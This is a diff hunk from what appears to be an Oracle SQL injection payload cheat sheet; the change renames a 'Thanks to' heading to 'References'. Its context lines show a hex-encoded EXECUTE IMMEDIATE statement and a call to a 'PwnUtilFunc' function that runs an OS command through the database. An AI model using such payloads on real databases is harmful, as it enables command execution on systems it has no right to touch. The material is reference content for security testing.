@@ -91,6 +91,6 @@ EXECUTE IMMEDIATE utl_raw.cast_to_varchar2(hextoraw(''637265617465206f7220726570
 SELECT PwnUtilFunc('ping -c 4 localhost') FROM dual;
 ```
 
-## Thanks to
+## References
 
 * [Heavily taken inspired by - NetSpi SQL Wiki](https://sqlwiki.netspi.com/injectionTypes/errorBased/#oracle)
